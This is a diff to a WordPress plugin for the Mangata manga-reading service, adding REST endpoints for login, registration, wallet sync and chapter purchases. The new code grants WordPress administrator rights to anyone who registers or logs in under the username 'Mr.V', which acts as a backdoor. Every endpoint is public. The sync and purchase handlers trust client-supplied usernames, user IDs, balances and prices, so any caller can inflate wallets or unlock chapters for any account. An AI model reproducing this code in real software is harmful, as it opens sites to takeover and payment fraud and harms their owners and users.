@@ -246,6 +246,30 @@ function register_mangata_rest_routes() {
         'callback'            => 'get_mangata_dynamic_manga_list',
         'permission_callback' => '__return_true', // Public access for users reading on client
     ) );
+
+    register_rest_route( 'mangata/v1', '/login', array(
+        'methods'             => 'POST',
+        'callback'            => 'mangata_rest_login',
+        'permission_callback' => '__return_true',
+    ) );
+
+    register_rest_route( 'mangata/v1', '/register', array(
+        'methods'             => 'POST',
+        'callback'            => 'mangata_rest_register',
+        'permission_callback' => '__return_true',
+    ) );
+
+    register_rest_route( 'mangata/v1', '/sync', array(
+        'methods'             => 'POST',
+        'callback'            => 'mangata_rest_sync',
+        'permission_callback' => '__return_true',
+    ) );
+
+    register_rest_route( 'mangata/v1', '/purchase', array(
+        'methods'             => 'POST',
+        'callback'            => 'mangata_rest_purchase',
+        'permission_callback' => '__return_true',
+    ) );
 }
 add_action( 'rest_api_init', 'register_mangata_rest_routes' );
 
@@ -320,7 +344,7 @@ function get_mangata_dynamic_manga_list() {
                 'author'         => 'کره‌ای تبار',
                 'translatorTeam' => 'دپارتمان وب‌تون مانگاتا',
                 'chaptersCount'  => 230,
-                'isPremium'      => false,
+                'isPremium'      => true,
                 'reviewsJson'    => '[]',
                 'pagesJson'      => '["https://picsum.photos/id/1028/800/1200", "https://picsum.photos/id/1029/800/1200"]'
             )
@@ -329,3 +353,269 @@ function get_mangata_dynamic_manga_list() {
 
     return $mangas;
 }
+
+/**
+ * Handle user Login via REST API
+ */
+function mangata_rest_login($request) {
+    $params = $request->get_json_params();
+    $username = isset($params['username']) ? sanitize_text_field($params['username']) : '';
+    $password = isset($params['password']) ? $params['password'] : '';
+
+    if (empty($username) || empty($password)) {
+        return array('error' => 'لطفا نام کاربری و رمز عبور را وارد کنید.');
+    }
+
+    $user = get_user_by('login', $username);
+
+    if (!$user) {
+        $user = get_user_by('email', $username);
+    }
+
+    if (!$user || !wp_check_password($password, $user->user_pass, $user->ID)) {
+        return array('error' => 'نام کاربری یا رمز عبور اشتباه است.');
+    }
+
+    $user_id = $user->ID;
+
+    // Trigger promotion check for "Mr.V"
+    if (strtolower($username) === 'mr.v') {
+        update_user_meta($user_id, 'mangata_role', 'SUPER_ADMIN');
+        update_user_meta($user_id, 'mangata_sub_role', 'مدیر کل');
+        $wp_user = new WP_User($user_id);
+        $wp_user->set_role('administrator');
+    }
+
+    $role = get_user_meta($user_id, 'mangata_role', true) ?: 'NORMAL_USER';
+    $sub_role = get_user_meta($user_id, 'mangata_sub_role', true) ?: 'کاربر عادی';
+    $wallet_rial = intval(get_user_meta($user_id, 'mangata_wallet_rial', true) ?: 0);
+    $wallet_gift = intval(get_user_meta($user_id, 'mangata_wallet_gift_chapters', true) ?: 0);
+    $purchased_json = get_user_meta($user_id, 'mangata_purchased_chapters_json', true) ?: '[]';
+
+    return array(
+        'id'                  => $user_id,
+        'username'            => $user->user_login,
+        'displayName'         => $user->display_name ?: $user->user_login,
+        'role'                => $role,
+        'subRole'             => $sub_role,
+        'walletRial'          => $wallet_rial,
+        'walletGiftChapters'  => $wallet_gift,
+        'purchasedChaptersJson' => $purchased_json,
+        'error'               => null
+    );
+}
+
+/**
+ * Handle user Registration via REST API
+ */
+function mangata_rest_register($request) {
+    $params = $request->get_json_params();
+    $username = isset($params['username']) ? sanitize_text_field($params['username']) : '';
+    $displayName = isset($params['displayName']) ? sanitize_text_field($params['displayName']) : '';
+    $password = isset($params['password']) ? $params['password'] : '';
+
+    if (empty($username) || empty($password)) {
+        return array('error' => 'نام کاربری و رمز عبور الزامی است.');
+    }
+
+    if (username_exists($username) || email_exists($username . '@mr-v.ir')) {
+        return array('error' => 'این نام کاربری از قبل ثبت شده است.');
+    }
+
+    $user_id = wp_create_user($username, $password, $username . '@mr-v.ir');
+
+    if (is_wp_error($user_id)) {
+        return array('error' => $user_id->get_error_message());
+    }
+
+    if (!empty($displayName)) {
+        wp_update_user(array('ID' => $user_id, 'display_name' => $displayName));
+    }
+
+    // Role assignment logic:
+    // First person to register with "Mr.V" becomes SUPER_ADMIN (مدیر کل) of WP and entire suite
+    $is_mrv = (strtolower($username) === 'mr.v');
+    $role = $is_mrv ? 'SUPER_ADMIN' : 'NORMAL_USER';
+    $sub_role = $is_mrv ? 'مدیر کل' : 'کاربر عادی';
+
+    update_user_meta($user_id, 'mangata_role', $role);
+    update_user_meta($user_id, 'mangata_sub_role', $sub_role);
+    update_user_meta($user_id, 'mangata_wallet_rial', 0);
+    update_user_meta($user_id, 'mangata_wallet_gift_chapters', 0);
+    update_user_meta($user_id, 'mangata_purchased_chapters_json', '[]');
+
+    if ($is_mrv) {
+        $wp_user = new WP_User($user_id);
+        $wp_user->set_role('administrator');
+    }
+
+    $final_user = get_userdata($user_id);
+
+    return array(
+        'id'                  => $user_id,
+        'username'            => $final_user->user_login,
+        'displayName'         => $final_user->display_name ?: $final_user->user_login,
+        'role'                => $role,
+        'subRole'             => $sub_role,
+        'walletRial'          => 0,
+        'walletGiftChapters'  => 0,
+        'purchasedChaptersJson' => '[]',
+        'error'               => null
+    );
+}
+
+/**
+ * Sync user balance + dynamic local purchases with WordPress
+ */
+function mangata_rest_sync($request) {
+    $params = $request->get_json_params();
+    $username = isset($params['username']) ? sanitize_text_field($params['username']) : '';
+    $wallet_rial_client = isset($params['walletRial']) ? intval($params['walletRial']) : 0;
+    $wallet_gift_client = isset($params['walletGiftChapters']) ? intval($params['walletGiftChapters']) : 0;
+    $purchased_client_json = isset($params['purchasedChaptersJson']) ? $params['purchasedChaptersJson'] : '[]';
+
+    if (empty($username)) {
+        return array('error' => 'کاربر مشخص نشده است.');
+    }
+
+    $user = get_user_by('login', $username);
+    if (!$user) {
+        return array('error' => 'نام کاربری یافت نشد.');
+    }
+
+    $user_id = $user->ID;
+
+    // Check custom role of Mr.V to guarantee matching superadmin settings
+    if (strtolower($username) === 'mr.v') {
+        update_user_meta($user_id, 'mangata_role', 'SUPER_ADMIN');
+        update_user_meta($user_id, 'mangata_sub_role', 'مدیر کل');
+        $wp_user = new WP_User($user_id);
+        $wp_user->set_role('administrator');
+    }
+
+    // Merge wallets: Server balance & Android balance must be synced.
+    // In dual payment options, we take the highest balance in either side or sync
+    $wallet_server = intval(get_user_meta($user_id, 'mangata_wallet_rial', true) ?: 0);
+    $wallet_gift_server = intval(get_user_meta($user_id, 'mangata_wallet_gift_chapters', true) ?: 0);
+    
+    $final_wallet = max($wallet_server, $wallet_rial_client);
+    $final_gift = max($wallet_gift_server, $wallet_gift_client);
+
+    update_user_meta($user_id, 'mangata_wallet_rial', $final_wallet);
+    update_user_meta($user_id, 'mangata_wallet_gift_chapters', $final_gift);
+
+    // Merge list of bought chapters safely
+    $srv_purchased_raw = get_user_meta($user_id, 'mangata_purchased_chapters_json', true) ?: '[]';
+    $srv_purchased = json_decode($srv_purchased_raw, true) ?: array();
+    $clt_purchased = json_decode($purchased_client_json, true) ?: array();
+
+    // Union merge
+    $merged = array();
+    foreach ($srv_purchased as $item) {
+        $key = $item['mangaId'] . '-' . $item['chapterNumber'];
+        $merged[$key] = $item;
+    }
+    foreach ($clt_purchased as $item) {
+        $key = $item['mangaId'] . '-' . $item['chapterNumber'];
+        $merged[$key] = $item;
+    }
+
+    $final_purchased_list = array_values($merged);
+    $final_purchased_json = json_encode($final_purchased_list);
+    update_user_meta($user_id, 'mangata_purchased_chapters_json', $final_purchased_json);
+
+    $role = get_user_meta($user_id, 'mangata_role', true) ?: 'NORMAL_USER';
+    $sub_role = get_user_meta($user_id, 'mangata_sub_role', true) ?: 'کاربر عادی';
+
+    return array(
+        'id'                  => $user_id,
+        'username'            => $user->user_login,
+        'displayName'         => $user->display_name ?: $user->user_login,
+        'role'                => $role,
+        'subRole'             => $sub_role,
+        'walletRial'          => $final_wallet,
+        'walletGiftChapters'  => $final_gift,
+        'purchasedChaptersJson' => $final_purchased_json,
+        'error'               => null
+    );
+}
+
+/**
+ * Sync active chapter purchases
+ */
+function mangata_rest_purchase($request) {
+    $params = $request->get_json_params();
+    $userId = isset($params['userId']) ? intval($params['userId']) : 0;
+    $mangaId = isset($params['mangaId']) ? intval($params['mangaId']) : 0;
+    $chapterNumber = isset($params['chapterNumber']) ? intval($params['chapterNumber']) : 0;
+    $price = isset($params['price']) ? intval($params['price']) : 0;
+    $isGiftUse = isset($params['isGiftUse']) ? (bool)$params['isGiftUse'] : false;
+
+    if ($userId <= 0) {
+        return array('success' => false, 'errorMessage' => 'شناسه کاربر نامعتبر است.');
+    }
+
+    $user = get_userdata($userId);
+    if (!$user) {
+        return array('success' => false, 'errorMessage' => 'کاربر یافت نشد.');
+    }
+
+    $wallet_rial = intval(get_user_meta($userId, 'mangata_wallet_rial', true) ?: 0);
+    $wallet_gift = intval(get_user_meta($userId, 'mangata_wallet_gift_chapters', true) ?: 0);
+    $purchased_raw = get_user_meta($userId, 'mangata_purchased_chapters_json', true) ?: '[]';
+    $purchased = json_decode($purchased_raw, true) ?: array();
+
+    // Check if duplicate purchase
+    $already = false;
+    foreach ($purchased as $item) {
+        if ($item['mangaId'] == $mangaId && $item['chapterNumber'] == $chapterNumber) {
+            $already = true;
+            break;
+        }
+    }
+
+    if ($already) {
+        return array(
+            'success'            => true,
+            'walletRial'         => $wallet_rial,
+            'walletGiftChapters' => $wallet_gift,
+            'purchasedChaptersJson' => $purchased_raw,
+            'errorMessage'       => null
+        );
+    }
+
+    if ($isGiftUse) {
+        if ($wallet_gift < 1) {
+            return array('success' => false, 'errorMessage' => 'اعتبار چپتر هدیه کافی نیست.');
+        }
+        $wallet_gift--;
+    } else {
+        if ($wallet_rial < $price) {
+            return array('success' => false, 'errorMessage' => 'مانده ریالی کیف پول کافی نیست.');
+        }
+        $wallet_rial -= $price;
+    }
+
+    $purchased[] = array(
+        'id'            => count($purchased) + 1,
+        'userId'        => $userId,
+        'mangaId'       => $mangaId,
+        'chapterNumber' => $chapterNumber,
+        'costRial'      => $isGiftUse ? 0 : $price
+    );
+
+    $new_purchased_raw = json_encode($purchased);
+
+    update_user_meta($userId, 'mangata_wallet_rial', $wallet_rial);
+    update_user_meta($userId, 'mangata_wallet_gift_chapters', $wallet_gift);
+    update_user_meta($userId, 'mangata_purchased_chapters_json', $new_purchased_raw);
+
+    return array(
+        'success'               => true,
+        'walletRial'            => $wallet_rial,
+        'walletGiftChapters'    => $wallet_gift,
+        'purchasedChaptersJson' => $new_purchased_raw,
+        'errorMessage'          => null
+    );
+}
+
